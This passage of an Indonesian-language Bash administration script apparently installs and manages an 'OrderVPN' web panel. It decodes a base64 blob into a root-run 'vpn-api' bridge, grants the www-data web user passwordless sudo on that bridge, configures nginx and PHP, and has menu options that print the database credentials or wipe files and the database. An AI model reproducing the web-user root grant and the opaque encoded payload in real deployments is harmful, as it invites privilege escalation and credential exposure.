zTjBQU1I3UkU5TlFVbE9mU1owZVhCbFBYZHpJeVI3VlZORlVrNUJUVVY5TFU1dmJsUk1VeUlLSUNBZ0lDQWdJQ0FnSUNBZ1RFbE9TMTlIVWxCRFBTSjJiR1Z6Y3pvdkx5UjdWVlZKUkgxQUpIdEVUMDFCU1U1OU9qUTBNejl0YjJSbFBXZDFiaVp6WldOMWNtbDBlVDEwYkhNbVpXNWpjbmx3ZEdsdmJqMXViMjVsSm5SNWNHVTlaM0p3WXlaelpYSjJhV05sVG1GdFpUMTJiR1Z6Y3kxbmNuQmpKbk51YVQxaWRXY3VZMjl0SXlSN1ZWTkZVazVCVFVWOUxXZFNVRU1pQ2lBZ0lDQWdJQ0FnWld4cFppQmJXeUFpSkZCU1QxUlBRMDlNSWlBOVBTQWlkSEp2YW1GdUlpQmRYVHNnZEdobGJnb2dJQ0FnSUNBZ0lDQWdJQ0JNU1U1TFgxUk1VejBpZEhKdmFtRnVPaTh2Skh0VlZVbEVmVUJpZFdjdVkyOXRPalEwTXo5d1lYUm9QU1V5Um5SeWIycGhiaVp6WldOMWNtbDBlVDEwYkhNbWFHOXpkRDBrZTBSUFRVRkpUbjBtZEhsd1pUMTNjeVp6Ym1rOUpIdEVUMDFCU1U1OUl5UjdWVk5GVWs1QlRVVjlMVlJNVXlJS0lDQWdJQ0FnSUNBZ0lDQWdURWxPUzE5T1QwNVVURk05SW5SeWIycGhiam92THlSN1ZWVkpSSDFBWW5WbkxtTnZiVG80TUQ5d1lYUm9QU1V5Um5SeWIycGhiaVp6WldOMWNtbDBlVDF1YjI1bEptaHZjM1E5Skh0RVQwMUJTVTU5Sm5SNWNHVTlkM01qSkh0VlUwVlNUa0ZOUlgwdFRtOXVWRXhUSWdvZ0lDQWdJQ0FnSUNBZ0lDQk1TVTVMWDBkU1VFTTlJblJ5YjJwaGJqb3ZMeVI3VlZWSlJIMUFKSHRFVDAxQlNVNTlPalEwTXo5dGIyUmxQV2QxYmlaelpXTjFjbWwwZVQxMGJITW1kSGx3WlQxbmNuQmpKbk5sY25acFkyVk9ZVzFsUFhSeWIycGhiaTFuY25CakpuTnVhVDFpZFdjdVkyOXRJeVI3VlZORlVrNUJUVVY5TFdkU1VFTWlDaUFnSUNBZ0lDQWdabWtLQ2lBZ0lDQWdJQ0FnYkc5blgyVjJaVzUwSURFZ0lpUjdVRkpQVkU5RFQweGVYbjFmUTFKRlFWUkZSQ0lLSUNBZ0lDQWdJQ0J3Y21sdWRHWWdKM3NpYzNWalkyVnpjeUk2ZEhKMVpTd2ljSEp2ZEc5amIyd2lPaUlsY3lJc0luVnpaWEp1WVcxbElqb2lKWE1pTENKMWRXbGtJam9pSlhNaUxDSnBjQ0k2SWlWeklpd2laRzl0WVdsdUlqb2lKWE1pTENKbGVIQnBjbVZrSWpvaUpYTWlMQ0pzYVc1clgzUnNjeUk2SWlWeklpd2liR2x1YTE5dWIyNTBiSE1pT2lJbGN5SXNJbXhwYm10ZlozSndZeUk2SWlWeklpd2laRzkzYm14dllXUWlPaUpvZEhSd09pOHZKWE02T0RFdkpYTXRKWE11ZEhoMEluMWNiaWNnWEFvZ0lDQWdJQ0FnSUNBZ0lDQWlKRkJTVDFSUFEwOU1JaUFpSkZWVFJWSk9RVTFGSWlBaUpGVlZTVVFpSUNJa1NWQmZWbEJUSWlBaUpFUlBUVUZKVGlJZ0lpUkZXRkFpSUNJa1RFbE9TMTlVVEZNaUlDSWtURWxPUzE5T1QwNVVURk1pSUNJa1RFbE9TMTlIVWxCRElpQWlKRWxRWDFaUVV5SWdJaVJRVWs5VVQwTlBUQ0lnSWlSVlUwVlNUa0ZOUlNJS0lDQWdJQ0FnSUNCbGVHbDBJREFnT3pzS0NpQWdJQ0JrWld4bGRHVXBDZ29nSUNBZ0lDQWdJQ01nUFQwOUlFMVZURlJKTFZaUVV6b2dVbVZrYVhKbFkzUWdaR1ZzWlhSbElHdGxJSEpsYlc5MFpTQTlQVDBLSUNBZ0lDQWdJQ0JwWmlCYld5QXRiaUFpSkZORlVsWkZVbDlEVDBSRklpQmRYVHNnZEdobGJnb2dJQ0FnSUNBZ0lDQWdJQ0J5WlcxdmRHVmZaWGhsWXlBaUpGTkZVbFpGVWw5RFQwUkZJaUFpSkVGRFZFbFBUaUlnSWlSUVVrOVVUME5QVENJZ0lpUlZVMFZTVGtGTlJTSWdJakFpSUNJd0lpQWlNQ0lLSUNBZ0lDQWdJQ0FnSUNBZ1pYaHBkQ0FrUHdvZ0lDQWdJQ0FnSUdacENpQWdJQ0FnSUNBZ2RtRnNhV1JoZEdWZmRYTmxjbTVoYldVZ0lpUlZVMFZTVGtGTlJTSUtJQ0FnSUNBZ0lDQmJXeUF0ZWlBaUpGQlNUMVJQUTA5TUlpQmRYU0FtSmlCN0lHVmphRzhnSjNzaWMzVmpZMlZ6Y3lJNlptRnNjMlVzSW0xbGMzTmhaMlVpT2lKUWNtOTBiMk52YkNCM1lXcHBZaUJrYVdsemFTSjlKenNnWlhocGRDQXhPeUI5Q2dvZ0lDQWdJQ0FnSUdsbUlGdGJJQ0lrVUZKUFZFOURUMHdpSUQwOUlDSnpjMmdpSUYxZE95QjBhR1Z1Q2lBZ0lDQWdJQ0FnSUNBZ0lIVnpaWEprWld3Z0lpUlZVMFZTVGtGTlJTSWdNajR2WkdWMkwyNTFiR3dLSUNBZ0lDQWdJQ0JsYkhObENpQWdJQ0FnSUNBZ0lDQWdJR0ZqY1hWcGNtVmZZMjl1Wm1sblgyeHZZMnNLSUNBZ0lDQWdJQ0FnSUNBZ1ZFVk5VRDBrS0cxcmRHVnRjQ2tLSUNBZ0lDQWdJQ0FnSUNBZ2FuRWdMUzFoY21jZ1pXMWhhV3dnSWlSVlUwVlNUa0ZOUlNJZ0oyUmxiQ2d1YVc1aWIzVnVaSE5iWFM1elpYUjBhVzVuY3k1amJHbGxiblJ6VzEwL2ZITmxiR1ZqZENndVpXMWhhV3c5UFNSbGJXRnBiQ2twSnlBaUpGaFNRVmxmUTA5T1JrbEhJaUErSUNJa1ZFVk5VQ0lnTWo0dlpHVjJMMjUxYkd3S0lDQWdJQ0FnSUNBZ0lDQWdhV1lnVzFzZ0xYTWdJaVJVUlUxUUlpQmRYU0FtSmlCcWNTQmxiWEIwZVNBaUpGUkZUVkFpSURJK0wyUmxkaTl1ZFd4c095QjBhR1Z1Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JwWmlCNGNtRjVJQzEwWlhOMElDMWpiMjVtYVdjZ0lpUlVSVTFRSWlBK0wyUmxkaTl1ZFd4c0lESStKakU3SUhSb1pXNEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J0ZGlBaUpGUkZUVkFpSUNJa1dGSkJXVjlEVDA1R1NVY2lDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnYzNsemRHVnRZM1JzSUhKbGMzUmhjblFnZUhKaGVTQStMMlJsZGk5dWRXeHNJREkrSmpFS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdWc2MyVWdjbTBnTFdZZ0lpUlVSVTFRSWpzZ1pta0tJQ0FnSUNBZ0lDQWdJQ0FnWld4elpTQnliU0F0WmlBaUpGUkZUVkFpT3lCbWFRb2dJQ0FnSUNBZ0lDQWdJQ0J5Wld4bFlYTmxYMk52Ym1acFoxOXNiMk5yQ2lBZ0lDQWdJQ0FnWm1rS0lDQWdJQ0FnSUNCeWJTQXRaaUFpSkVGTFZVNWZSRWxTTHlSN1VGSlBWRTlEVDB4OUxTUjdWVk5GVWs1QlRVVjlMblI0ZENJZ0lpUlFWVUpNU1VOZlNGUk5UQzhrZTFCU1QxUlBRMDlNZlMwa2UxVlRSVkpPUVUxRmZTNTBlSFFpQ2lBZ0lDQWdJQ0FnYkc5blgyVjJaVzUwSURFZ0lpUjdVRkpQVkU5RFQweGVYbjFmUkVWTVJWUkZSQ0lLSUNBZ0lDQWdJQ0JsWTJodklDZDdJbk4xWTJObGMzTWlPblJ5ZFdVc0ltMWxjM05oWjJVaU9pSkJhM1Z1SUdKbGNtaGhjMmxzSUdScGFHRndkWE1pZlNjZ096c0tDaUFnSUNCemRHRjBkWE1wQ2lBZ0lDQWdJQ0FnY0hKcGJuUm1JQ2Q3SW5oeVlYa2lPaUlsY3lJc0ltNW5hVzU0SWpvaUpYTWlMQ0pvWVhCeWIzaDVJam9pSlhNaUxDSmtiMjFoYVc0aU9pSWxjeUlzSW1sd0lqb2lKWE1pZlZ4dUp5QmNDaUFnSUNBZ0lDQWdJQ0FnSUNJa0tITjVjM1JsYldOMGJDQnBjeTFoWTNScGRtVWdlSEpoZVNBeVBpOWtaWFl2Ym5Wc2JDa2lJQ0lrS0hONWMzUmxiV04wYkNCcGN5MWhZM1JwZG1VZ2JtZHBibmdnTWo0dlpHVjJMMjUxYkd3cElpQmNDaUFnSUNBZ0lDQWdJQ0FnSUNJa0tITjVjM1JsYldOMGJDQnBjeTFoWTNScGRtVWdhR0Z3Y205NGVTQXlQaTlrWlhZdmJuVnNiQ2tpSUZ3S0lDQWdJQ0FnSUNBZ0lDQWdJaVFvWTJGMElDOXliMjkwTDJSdmJXRnBiaUF5UGk5a1pYWXZiblZzYkh4MGNpQXRaQ0FuWEc1Y2NpZDhlR0Z5WjNNcElpQmNDaUFnSUNBZ0lDQWdJQ0FnSUNJa0tHTjFjbXdnTFhNZ0xTMXRZWGd0ZEdsdFpTQTFJR2xtWTI5dVptbG5MbTFsSURJK0wyUmxkaTl1ZFd4c2ZIeG9iM04wYm1GdFpTQXRTWHhoZDJzZ0ozdHdjbWx1ZENBa01YMG5LU0lnT3pzS0NpQWdJQ0JzYVhOMEtRb2dJQ0FnSUNBZ0lGdGJJQzE2SUNJa1VGSlBWRTlEVDB3aUlGMWRJQ1ltSUZCU1QxUlBRMDlNUFNJcUlqc2daV05vYnlBaVd5STdJRVpKVWxOVVBURTdJSE5vYjNCMElDMXpJRzUxYkd4bmJHOWlDaUFnSUNBZ0lDQWdabTl5SUdZZ2FXNGdJaVJCUzFWT1gwUkpVaUl2Skh0UVVrOVVUME5QVEgwdEtpNTBlSFE3SUdSdkNpQWdJQ0FnSUNBZ0lDQWdJRnRiSUNFZ0xXWWdJaVJtSWlCZFhTQW1KaUJqYjI1MGFXNTFaUW9nSUNBZ0lDQWdJQ0FnSUNCR1RrRk5SVDBrS0dKaGMyVnVZVzFsSUNJa1ppSWdMblI0ZENrN0lGQlNUMVJQUFNJa2UwWk9RVTFGSlNVdEtuMGlPeUJWVGtGTlJUMGlKSHRHVGtGTlJTTXFMWDBpQ2lBZ0lDQWdJQ0FnSUNBZ0lFVllVRjlKVGtaUFBTUW9aM0psY0NBaVJWaFFTVkpGUkQwaUlDSWtaaUlnTWo0dlpHVjJMMjUxYkd4OFkzVjBJQzFrUFNBdFpqSXRLUW9nSUNBZ0lDQWdJQ0FnSUNCVlZVbEVYMGxPUms4OUpDaG5jbVZ3SUNKVlZVbEVQU0lnSWlSbUlpQXlQaTlrWlhZdmJuVnNiSHhqZFhRZ0xXUTlJQzFtTWkwcENpQWdJQ0FnSUNBZ0lDQWdJRnRiSUNSR1NWSlRWQ0F0WlhFZ01DQmRYU0FtSmlCbFkyaHZJQ0lzSWdvZ0lDQWdJQ0FnSUNBZ0lDQndjbWx1ZEdZZ0ozc2ljSEp2ZEc5amIyd2lPaUlsY3lJc0luVnpaWEp1WVcxbElqb2lKWE1pTENKbGVIQnBjbVZrSWpvaUpYTWlMQ0oxZFdsa0lqb2lKWE1pZlNjZ0lpUlFVazlVVHlJZ0lpUlZUa0ZOUlNJZ0lpUkZXRkJmU1U1R1R5SWdJaVJWVlVsRVgwbE9SazhpQ2lBZ0lDQWdJQ0FnSUNBZ0lFWkpVbE5VUFRBS0lDQWdJQ0FnSUNCa2IyNWxPeUJ6YUc5d2RDQXRkU0J1ZFd4c1oyeHZZanNnWldOb2J5QWlJanNnWldOb2J5QWlYU0lnT3pzS0NpQWdJQ0FxS1NCbFkyaHZJQ2Q3SW5OMVkyTmxjM01pT21aaGJITmxMQ0p0WlhOellXZGxJam9pUVdOMGFXOXVJSFJwWkdGcklHUnBhMlZ1WVd3aWZTY2dPenNLWlhOaFl3bz0KQlJJREdFRU9GCgpjaG1vZCAreCAiJEJSSURHRV9QQVRIIgoKIyAtLS0gU3Vkb2VycyBmb3Igd3d3LWRhdGEgLS0tCmNhdCA+IC9ldGMvc3Vkb2Vycy5kL29yZGVydnBuLWFwaSA8PCAnU1VET0VPRicKd3d3LWRhdGEgQUxMPShyb290KSBOT1BBU1NXRDogL3Vzci9sb2NhbC9iaW4vdnBuLWFwaQpTVURPRU9GCmNobW9kIDQ0MCAvZXRjL3N1ZG9lcnMuZC9vcmRlcnZwbi1hcGkKCiMgLS0tIERvbWFpbiAodXNlIElQIGlmIG5vdCBzZXQpIC0tLQpET01BSU49IiR7SVBfVlBTfSIKaWYgWyAtZiAvcm9vdC9kb21haW4gXTsgdGhlbgogICAgRE9NQUlOPSQoY2F0IC9yb290L2RvbWFpbiB8IHRyIC1kICdcblxyJyB8IHhhcmdzKQpmaQplY2hvICIkRE9NQUlOIiA+IC9yb290L2RvbWFpbiAyPi9kZXYvbnVsbAoKIyAtLS0gRGV0ZWN0IHJlZ2lvbiAtLS0KUkVHSU9OPSJVbmtub3duIgpSRUdJT049JChjdXJsIC00IC1zIC0tbWF4LXRpbWUgNSAiaHR0cDovL2lwLWFwaS5jb20vanNvbi8ke0lQX1ZQU30/ZmllbGRzPWNvdW50cnksY2l0eSIgMj4vZGV2L251bGwgfCBweXRob24zIC1jICJpbXBvcnQgc3lzLGpzb247IGQ9anNvbi5sb2FkKHN5cy5zdGRpbik7IHByaW50KGQuZ2V0KCdjaXR5JywnJykrJywgJytkLmdldCgnY291bnRyeScsJycpKSIgMj4vZGV2L251bGwgfHwgZWNobyAiVW5rbm93biIpCgojIC0tLSBEZXRlY3Qgb3BlbiBwb3J0cyAtLS0KT1BFTl9QT1JUUz0kKHNzIC10bG5wIDI+L2Rldi9udWxsIHwgYXdrICd7cHJpbnQgJDR9JyB8IGdyZXAgLW9FICc6WzAtOV0rJCcgfCB0ciAtZCAnOicgfCBzb3J0IC1uIHwgdW5pcSB8IHRyICdcbicgJyAnIHwgeGFyZ3MpCgojIC0tLSBGaW5hbCBzdGF0dXMgLS0tClhSQVlfU1RBVFVTPSQoc3lzdGVtY3RsIGlzLWFjdGl2ZSB4cmF5IDI+L2Rldi9udWxsIHx8IGVjaG8gImluYWN0aXZlIikKTkdJTlhfU1RBVFVTPSQoc3lzdGVtY3RsIGlzLWFjdGl2ZSBuZ2lueCAyPi9kZXYvbnVsbCB8fCBlY2hvICJpbmFjdGl2ZSIpCgojIE91dHB1dCBKU09OIHJlc3VsdApjYXQgPDwgSlNPTkVPRgp7InN1Y2Nlc3MiOnRydWUsImlwIjoiJHtJUF9WUFN9IiwicmVnaW9uIjoiJHtSRUdJT059IiwiZG9tYWluIjoiJHtET01BSU59Iiwib3MiOiIke09TfSIsInBvcnRzIjoiJHtPUEVOX1BPUlRTfSIsInhyYXkiOiIke1hSQVlfU1RBVFVTfSIsIm5naW54IjoiJHtOR0lOWF9TVEFUVVN9IiwiYnJpZGdlIjoiaW5zdGFsbGVkIn0KSlNPTkVPRgoKZWNobyAiPT09IEluc3RhbGwgQ29tcGxldGU6ICQoZGF0ZSkgPT09Igo=" | base64 -d > "$REMOTE_INSTALLER"

    chmod +x "$REMOTE_INSTALLER"





    cat > /etc/sudoers.d/ordervpn-api << 'SUDOEOF'



www-data ALL=(root) NOPASSWD: /usr/local/bin/vpn-api



SUDOEOF



    chmod 440 /etc/sudoers.d/ordervpn-api



    # FIX: Perbaiki path domain di bridge - gunakan /root/domain bukan /etc/xray/domain



    sed -i "s|/etc/xray/domain|/root/domain|g" "$BRIDGE"



}







_ordervpn_setup_nginx() {



    local PORT="${1:-8888}"



    local SUB="${2:-}"



    local DIR="/var/www/html/ordervpn"



    local PHP_SOCK=""



    for sock in /var/run/php/php*.fpm.sock; do [[ -S "$sock" ]] && { PHP_SOCK="unix:$sock"; break; }; done



    # Coba semua versi PHP yang mungkin (8.3, 8.2, 8.1, 8.0, 7.4)



    if [[ -z "$PHP_SOCK" ]]; then



        for phpver in 8.3 8.2 8.1 8.0 7.4; do



            [[ -S "/var/run/php/php${phpver}-fpm.sock" ]] && { PHP_SOCK="unix:/var/run/php/php${phpver}-fpm.sock"; break; }



        done



    fi



    [[ -z "$PHP_SOCK" ]] && PHP_SOCK="unix:/var/run/php/php8.1-fpm.sock"



    cat > /etc/nginx/sites-available/ordervpn << NGINXEOF



server {



    listen ${PORT};



    listen [::]:${PORT};



    server_name _;



    root ${DIR};



    index index.php;



    charset utf-8;



    client_max_body_size 5M;



    # Security: block sensitive files



    location ~ /includes/ { deny all; }



    location ~ /cron/     { deny all; }



    location ~ /\.ht      { deny all; }



    location ~ \.(bak|old|save|sw[op]|backup|sql|log|git|env)$ { deny all; }



    location ~ /\.         { deny all; }



    # Security headers



    add_header X-Frame-Options "DENY" always;



    add_header X-Content-Type-Options "nosniff" always;



    add_header Referrer-Policy "no-referrer" always;



    location / { try_files \$uri \$uri/ /index.php?\$query_string; }



    location ~ \.php$ {



        try_files \$uri =404;



        fastcgi_split_path_info ^(.+\.php)(/.+)\$;



        fastcgi_pass ${PHP_SOCK};



        fastcgi_index index.php;



        fastcgi_param SCRIPT_FILENAME \$realpath_root\$fastcgi_script_name;



        include fastcgi_params;



        fastcgi_read_timeout 120;



        add_header X-Frame-Options "DENY" always;



        add_header X-Content-Type-Options "nosniff" always;



        add_header Referrer-Policy "no-referrer" always;



    }



}



NGINXEOF



    ln -sf /etc/nginx/sites-available/ordervpn /etc/nginx/sites-enabled/ordervpn 2>/dev/null



    if [[ -n "$SUB" ]]; then



        cat > /etc/nginx/sites-available/ordervpn-domain << NGINXEOF2



server {



    listen 80;



    server_name ${SUB};



    root ${DIR};



    index index.php;



    charset utf-8;



    client_max_body_size 5M;



    # Security: block sensitive files



    location ~ /includes/ { deny all; }



    location ~ /cron/     { deny all; }



    location ~ /\.ht      { deny all; }



    location ~ \.(bak|old|save|sw[op]|backup|sql|log|git|env)$ { deny all; }



    location ~ /\.         { deny all; }



    # Security headers



    add_header X-Frame-Options "DENY" always;



    add_header X-Content-Type-Options "nosniff" always;



    add_header Referrer-Policy "no-referrer" always;



    location / { try_files \$uri \$uri/ /index.php?\$query_string; }



    location ~ \.php$ {



        try_files \$uri =404;



        fastcgi_split_path_info ^(.+\.php)(/.+)\$;



        fastcgi_pass ${PHP_SOCK};



        fastcgi_index index.php;



        fastcgi_param SCRIPT_FILENAME \$realpath_root\$fastcgi_script_name;



        include fastcgi_params;



        fastcgi_read_timeout 120;



        add_header X-Frame-Options "DENY" always;



        add_header X-Content-Type-Options "nosniff" always;



        add_header Referrer-Policy "no-referrer" always;



    }



}



server {



    listen 443 ssl http2;



    server_name ${SUB};







    ssl_certificate /etc/xray/xray.crt;



    ssl_certificate_key /etc/xray/xray.key;



    ssl_protocols TLSv1.2 TLSv1.3;



    ssl_ciphers HIGH:!aNULL:!MD5;



    ssl_session_cache shared:SSL:10m;



    ssl_session_timeout 1d;







    root ${DIR};



    index index.php;



    charset utf-8;



    client_max_body_size 5M;



    # Security: block sensitive files



    location ~ /includes/ { deny all; }



    location ~ /cron/     { deny all; }



    location ~ /\.ht      { deny all; }



    location ~ \.(bak|old|save|sw[op]|backup|sql|log|git|env)$ { deny all; }



    location ~ /\.         { deny all; }



    # Security headers



    add_header X-Frame-Options "DENY" always;



    add_header X-Content-Type-Options "nosniff" always;



    add_header Referrer-Policy "no-referrer" always;



    location / { try_files \$uri \$uri/ /index.php?\$query_string; }



    location ~ \.php$ {



        try_files \$uri =404;



        fastcgi_split_path_info ^(.+\.php)(/.+)\$;



        fastcgi_pass ${PHP_SOCK};



        fastcgi_index index.php;



        fastcgi_param SCRIPT_FILENAME \$realpath_root\$fastcgi_script_name;



        include fastcgi_params;



        fastcgi_read_timeout 120;



        add_header X-Frame-Options "DENY" always;



        add_header X-Content-Type-Options "nosniff" always;



        add_header Referrer-Policy "no-referrer" always;



    }



}



NGINXEOF2



        ln -sf /etc/nginx/sites-available/ordervpn-domain /etc/nginx/sites-enabled/ordervpn-domain 2>/dev/null



    fi



    # Start dan enable PHP-FPM versi berapapun yang terinstall



    for svc in $(systemctl list-units --type=service 2>/dev/null | grep -oE 'php[0-9.]+-fpm' | sort -u); do



        systemctl start "$svc" 2>/dev/null



        systemctl enable "$svc" 2>/dev/null



    done || true



    nginx -t 2>/dev/null && systemctl reload nginx 2>/dev/null



}







menu_ordervpn() {



    local LOG="/var/log/ordervpn-install.log"



    # Pastikan file log ada dari awal agar opsi [4] tidak error



    [[ ! -f "$LOG" ]] && touch "$LOG" 2>/dev/null || true



    while true; do



        clear



        print_menu_header "ORDERVPN WEB PANEL v2.0"



        local IP_NOW; IP_NOW=$(get_ip 2>/dev/null || hostname -I | awk "{print \$1}")



        # Tampilkan URL dengan domain jika ada, fallback ke IP



        local DISPLAY_HOST="$IP_NOW"



        [[ -n "$DOMAIN" ]] && DISPLAY_HOST="$DOMAIN"



        if [[ -f /var/www/html/ordervpn/index.php ]]; then



            printf "  Status : ${GREEN}✔ Terinstall${NC}\n"



            printf "  URL    : ${CYAN}http://%s:8888${NC}\n" "$DISPLAY_HOST"



        echo -e "  ${RED}⚠ Ganti password admin default! Pilih menu [9] di bawah.${NC}"



            [[ -n "$DOMAIN" ]] && printf "  Domain : ${CYAN}http://%s${NC} (jika sudah setup subdomain)\n" "$DOMAIN"



        else



            printf "  Status : ${RED}✘ Belum diinstall${NC}\n"



        fi



        echo ""



        printf "  ${WHITE}[1]${NC} Install / Reinstall OrderVPN\n"



        printf "  ${WHITE}[2]${NC} Test vpn-api bridge + cek DB\n"



        printf "  ${WHITE}[3]${NC} Restart PHP-FPM + Nginx (port 8888)\n"



        printf "  ${WHITE}[4]${NC} Lihat log instalasi\n"



        printf "  ${WHITE}[5]${NC} Setup subdomain custom\n"



        printf "  ${WHITE}[6]${NC} Uninstall OrderVPN\n"



        printf "  ${WHITE}[7]${NC} Rebuild vpn-api bridge\n"



        printf "  ${WHITE}[8]${NC} Tampilkan kredensial DB\n"



        printf "  ${WHITE}[9]${NC} Ganti password admin\n"



        printf "  ${RED}[0]${NC} Kembali ke Menu\n"



        echo ""



        read -rp "  Select: " ovpn_choice



        case $ovpn_choice in



            1) _ordervpn_install "$@" ;;



            2)



                clear; print_menu_header "TEST VPN-API BRIDGE"



                if [[ -x /usr/local/bin/vpn-api ]]; then



                    echo -e "  ${CYAN}→ Status services:${NC}"



                    /usr/local/bin/vpn-api status 2>/dev/null | python3 -m json.tool 2>/dev/null || /usr/local/bin/vpn-api status



                    echo ""



                    if [[ -f /root/.ordervpn_db ]]; then



                        # shellcheck disable=SC1091



                        source /root/.ordervpn_db 2>/dev/null



                        echo -e "  ${CYAN}→ Test koneksi DB:${NC}"



                        if mysql -u"$DB_USER" -p"$DB_PASS" "$DB_NAME" -e "SELECT COUNT(*) as total_users FROM users;" 2>/dev/null; then



                            echo -e "  ${GREEN}✔ Koneksi DB OK${NC}"



                        else



                            echo -e "  ${RED}✘ Koneksi DB GAGAL — cek DB_PASS di /root/.ordervpn_db${NC}"



                        fi



                    else



                        echo -e "  ${YELLOW}File kredensial DB tidak ditemukan. Install ulang dulu.${NC}"



                    fi



                    printf "  ${DIM}Contoh: vpn-api create vmess user30 30 100 2${NC}\n"



                else



                    echo -e "  ${RED}vpn-api belum dipasang. Install dulu (opsi 1)${NC}"



                fi



                echo ""; read -rp "  Tekan ENTER..." ;;



            3)



                clear; print_menu_header "RESTART PHP-FPM + NGINX"



                local php_svc



                php_svc=$(systemctl list-units --type=service --state=active 2>/dev/null | grep -oP 'php\S+fpm' | head -1)



                [[ -z "$php_svc" ]] && php_svc=$(systemctl list-unit-files --type=service 2>/dev/null | grep -oP 'php\S+fpm' | head -1)



                [[ -z "$php_svc" ]] && php_svc="php-fpm"



                echo ""



                # Restart PHP-FPM



                if systemctl restart "$php_svc" 2>/dev/null; then



                    printf "  ${GREEN}✔${NC} PHP-FPM (${php_svc}) direstart\n"



                else



                    printf "  ${RED}✘${NC} Gagal restart PHP-FPM (${php_svc})\n"



                fi



                # Test dan reload nginx (jangan restart mentah-mentah, bisa drop koneksi VPN)



                if nginx -t 2>/dev/null; then



                    printf "  ${GREEN}✔${NC} Nginx config OK\n"



                    if systemctl reload nginx 2>/dev/null; then



                        printf "  ${GREEN}✔${NC} Nginx direload\n"



                    else



                        printf "  ${RED}✘${NC} Gagal reload Nginx\n"



                    fi



                else



                    printf "  ${RED}✘${NC} Nginx config ERROR — jalankan: nginx -t\n"



                fi



                echo ""; read -rp "  Tekan ENTER..." ;;



            4)



                clear; print_menu_header "LOG INSTALASI ORDERVPN"



                if [[ -f "$LOG" ]]; then



                    tail -60 "$LOG"



                    echo ""



                    printf "  ${DIM}Log lengkap: %s${NC}\n" "$LOG"



                else



                    echo -e "  ${DIM}Log belum ada — install dulu (opsi 1)${NC}"



                fi



                echo ""; read -rp "  Tekan ENTER..." ;;



            5)



                echo ""



                read -rp "  Masukkan subdomain (contoh: order.domain.com): " subdomain



                if [[ -z "$subdomain" ]]; then



                    echo -e "  ${YELLOW}Subdomain kosong, dibatalkan.${NC}"



                    sleep 1



                elif [[ ! "$subdomain" =~ ^[a-zA-Z0-9._-]+$ ]]; then



                    echo -e "  ${RED}Format subdomain tidak valid.${NC}"



                    sleep 2



                else



                    printf "  ${CYAN}▸${NC} Setup nginx untuk %s...\n" "$subdomain"



                    if _ordervpn_setup_nginx 8888 "$subdomain"; then



                        echo -e "  ${GREEN}✔ Subdomain $subdomain berhasil disetup${NC}"



                        printf "  ${DIM}Pastikan DNS subdomain sudah mengarah ke IP: %s${NC}\n" "$IP_NOW"



                    else



                        echo -e "  ${RED}✘ Gagal setup subdomain $subdomain${NC}"



                    fi



                fi



                echo ""; read -rp "  Tekan ENTER..." ;;



            6)



                echo ""



                read -rp "  Yakin uninstall OrderVPN? Semua data akan dihapus! [y/N]: " yn



                if [[ "${yn,,}" == "y" ]]; then



                    printf "  ${CYAN}▸${NC} Menghapus file web...\n"



                    rm -rf /var/www/html/ordervpn



                    printf "  ${CYAN}▸${NC} Menghapus config nginx...\n"



                    rm -f /etc/nginx/sites-{available,enabled}/ordervpn{,-domain}



                    printf "  ${CYAN}▸${NC} Menghapus vpn-api bridge...\n"



                    rm -f /usr/local/bin/vpn-api /etc/sudoers.d/ordervpn-api



                    printf "  ${CYAN}▸${NC} Hapus database...\n"



                    mysql -u root -e "DROP DATABASE IF EXISTS ordervpn_db; DROP USER IF EXISTS 'ordervpn'@'localhost';" 2>/dev/null \
                        && printf "  ${GREEN}✔${NC} Database dihapus\n" \
                        || printf "  ${YELLOW}⚠${NC} DB sudah tidak ada atau gagal hapus\n"



                    # Hapus cron



                    crontab -l 2>/dev/null | grep -v "ordervpn" | crontab - 2>/dev/null



                    if nginx -t 2>/dev/null; then



                        systemctl reload nginx 2>/dev/null



                    fi



                    echo -e "\n  ${GREEN}✔ OrderVPN berhasil diuninstall${NC}"



                else



                    echo -e "  ${DIM}Dibatalkan.${NC}"



                fi



                sleep 2 ;;



            7)



                clear; print_menu_header "REBUILD VPN-API BRIDGE"



                printf "  ${CYAN}▸${NC} Deploy ulang vpn-api bridge...\n"



                if _ordervpn_deploy_bridge; then



                    printf "  ${GREEN}✔ vpn-api bridge berhasil di-rebuild${NC}\n"



                    printf "  ${DIM}Path: /usr/local/bin/vpn-api${NC}\n"



                    # Verifikasi langsung



                    if [[ -x /usr/local/bin/vpn-api ]]; then



                        printf "  ${GREEN}✔ File executable OK${NC}\n"



                    else



                        printf "  ${RED}✘ File tidak executable — cek permission${NC}\n"



                    fi



                else



                    printf "  ${RED}✘ Gagal deploy vpn-api bridge${NC}\n"



                fi



                echo ""; read -rp "  Tekan ENTER..." ;;



            8)



                clear; print_menu_header "KREDENSIAL DATABASE ORDERVPN"



                if [[ -f /root/.ordervpn_db ]]; then



                    echo ""



                    cat /root/.ordervpn_db



                    echo ""



                    echo -e "  ${DIM}File: /root/.ordervpn_db (chmod 600)${NC}"



                else



                    echo -e "  ${RED}File kredensial tidak ditemukan.${NC}"



                    echo -e "  ${DIM}Coba install ulang (opsi 1) untuk membuat ulang file ini.${NC}"



                fi



                echo ""; read -rp "  Tekan ENTER..." ;;



            0) return ;;



        esac



    done



}







_ordervpn_install() {



    local LOG="/var/log/ordervpn-install.log"



    echo "" > "$LOG"



    clear; print_menu_header "INSTALL ORDERVPN v2.0"



    echo ""



    printf "  ${YELLOW}Proses install akan:${NC}\n"



    printf "  ${DIM}1. Install PHP, MySQL (jika belum)${NC}\n"



    printf "  ${DIM}2. Deploy web OrderVPN ke /var/www/html/ordervpn${NC}\n"



    printf "  ${DIM}3. Pasang vpn-api bridge (sync tunnel.sh)${NC}\n"



    printf "  ${DIM}4. Setup Nginx port 8888${NC}\n"



    printf "  ${DIM}5. Setup database otomatis${NC}\n"



    echo ""



    read -rp "  Lanjut? [y/N]: " confirm



    [[ "${confirm,,}" != "y" ]] && return



    echo ""; read -rp "  Subdomain custom? (kosongkan=skip): " SUBDOMAIN







    # Install deps



    printf "  ${CYAN}▸${NC} Install dependensi...\n"



    apt-get update -qq >> "$LOG" 2>&1



    local pkgs=()



    command -v mysql    >/dev/null 2>&1 || pkgs+=(mysql-server)



    command -v php      >/dev/null 2>&1 || pkgs+=(php php-fpm php-mysql php-curl php-mbstring php-gd)



    command -v sshpass  >/dev/null 2>&1 || pkgs+=(sshpass)



